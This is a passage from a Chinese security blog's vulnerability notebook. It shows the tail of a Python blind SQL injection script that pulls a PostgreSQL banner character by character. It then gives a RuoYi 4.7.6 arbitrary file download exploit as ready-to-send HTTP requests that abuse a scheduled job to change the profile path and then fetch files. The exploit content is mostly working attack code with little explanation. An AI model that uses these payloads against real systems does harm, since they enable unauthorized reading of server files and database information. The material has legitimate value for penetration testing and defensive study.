warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            r = requests.get(url, headers=headers, cookies=cookies, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PG::DivisionByZero&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># update and print result</span></span><br><span class="line">            result.append(char)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] DBMS Banner: &quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot; &quot;</span>:</span><br><span class="line">            <span class="comment"># stop search if no match found</span></span><br><span class="line">            search = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><p>4.7.6任意文件下载</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ">https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxx/RuoYi/upload/123.txt&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=xxxx.yaml;.zip HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxxx/RuoYi/upload&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=/profile/123.txt HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://wangzhi0013.github.io">wangzhiii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://wangzhi0013.github.io/2023/06/13/%E6%BC%8F%E6%B4%9E/">http://wangzhi0013.github.io/2023/06/13/%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://wangzhi0013.github.io" target="_blank">wangzhiii的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></div><div class="post_share"><div class="social-share" data-image="/./img/8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/16/%E5%8A%A0%E5%9B%BA%E5%92%8C%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="加固和应急响应"><img class="cover" src="/./img/10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">加固和应急响应</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/12/shiro%E5%A4%8D%E7%8E%B0/" title="shiro550分析复现"><img class="cover" src="/./img/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">shiro550分析复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/06/23/weblogic/" title="weblogic漏洞笔记"><img class="cover" src="/./img/9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-23</div><div class="title">weblogic漏洞笔记</div></div></a></div><div><a href="/2023/06/12/shiro%E5%A4%8D%E7%8E%B0/" title="shiro550分析复现"><img class="cover" src="/./img/12.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-12</div><div class="title">shiro550分析复现</div></div></a></div><div><a href="/2023/06/12/ssrf%E7%AC%94%E8%AE%B0/" title="ssrf笔记"><img class="cover" src="/./img/10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-12</div><div class="title">ssrf笔记</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">wangzhiii</div><div class="author-info__description">欢迎访问</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/wangzhi0013"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">1.</span> <span class="toc-text">php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-cgi%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2012-1823"><span class="toc-number">1.1.</span> <span class="toc-text">php-cgi的远程代码执行漏洞(CVE-2012-1823)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OA%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">OA系统</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8F%E6%99%AFHR%E7%B3%BB%E7%BB%9F-CNVD-2023-08743"><span class="toc-number">2.1.</span> <span class="toc-text">宏景HR系统 CNVD-2023-08743</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fofa%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">fofa语法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#poc"><span class="toc-number">2.1.2.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEE-Cology"><span class="toc-number">2.2.</span> <span class="toc-text">泛微E-Cology</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#FileDownloadForOutDoc-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">FileDownloadForOutDoc  SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">影响版本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BARCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.3.</span> <span class="toc-text">金蝶云星空RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.3.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">2.3.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fofa%E8%AF%AD%E6%B3%95-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">fofa语法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#poc-1"><span class="toc-number">2.3.4.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.3.5.</span> <span class="toc-text">修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">升级修复方案</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis"><span class="toc-number">3.</span> <span class="toc-text">redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.1.</span> <span class="toc-text">计划任务反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH%E5%85%AC%E9%92%A5"><span class="toc-number">3.2.</span> <span class="toc-text">SSH公钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="toc-number">3.4.</span> <span class="toc-text">主从复制rce</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache"><span class="toc-number">4.</span> <span class="toc-text">apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos"><span class="toc-number">5.</span> <span class="toc-text">nacos</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86"><span class="toc-number">6.</span> <span class="toc-text">海康威视</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">6.1.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2017-7921-x2F-7923"><span class="toc-number">6.2.</span> <span class="toc-text">cve-2017-7921&#x2F;7923</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2021-36260"><span class="toc-number">6.3.</span> <span class="toc-text">cve-2021-36260</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.4.</span> <span class="toc-text">海康威视流媒体管理服务器后台任意文件读取漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iVMS%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%880day%EF%BC%89"><span class="toc-number">6.5.</span> <span class="toc-text">海康威视iVMS综合安防系统任意文件上传漏洞（0day）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86IVMS%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.6.</span> <span class="toc-text">海康威视IVMS系统任意文件上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8Fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%882022-HVV%E6%B4%9E%EF%BC%89"><span class="toc-number">6.7.</span> <span class="toc-text">海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86AK%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.8.</span> <span class="toc-text">海康威视AK信息泄露漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%A7%91"><span class="toc-number">7.</span> <span class="toc-text">思科</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8B%A5%E4%BE%9D"><span class="toc-number">8.</span> <span class="toc-text">若依</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/18/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%9F%B9%E8%AE%AD/" title="安全设备培训"><img src="/./img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安全设备培训"/></a><div class="content"><a class="title" href="/2023/07/18/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%9F%B9%E8%AE%AD/" title="安全设备培训">安全设备培训</a><time datetime="2023-07-18T06:17:07.210Z" title="发表于 2023-07-18 14:17:07">2023-07-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/14/%E5%AE%89%E8%A3%85%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6/" title="各种软件的安装"><img src="/./img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="各种软件的安装"/></a><div class="content"><a class="title" href="/2023/07/14/%E5%AE%89%E8%A3%85%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6/" title="各种软件的安装">各种软件的安装</a><time datetime="2023-07-14T08:46:16.485Z" title="发表于 2023-07-14 16:46:16">2023-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/14/%E6%89%93%E7%82%B9/" title="打点"><img src="/./img/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="打点"/></a><div class="content"><a class="title" href="/2023/07/14/%E6%89%93%E7%82%B9/" title="打点">打点</a><time datetime="2023-07-14T01:31:35.517Z" title="发表于 2023-07-14 09:31:35">2023-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/11/Proxifier/" title="Proxifier"><img src="/./img/1.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Proxifier"/></a><div class="content"><a class="title" href="/2023/07/11/Proxifier/" title="Proxifier">Proxifier</a><time datetime="2023-07-11T12:37:09.902Z" title="发表于 2023-07-11 20:37:09">2023-07-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/08/%E6%9C%A8%E9%A9%AC/" title="免杀马"><img src="/./img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="免杀马"/></a><div class="content"><a class="title" href="/2023/07/08/%E6%9C%A8%E9%A9%AC/" title="免杀马">免杀马</a><time datetime="2023-07-08T06:02:25.355Z" title="发表于 2023-07-08 14:02:25">2023-07-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/./img/8.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By wangzhiii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>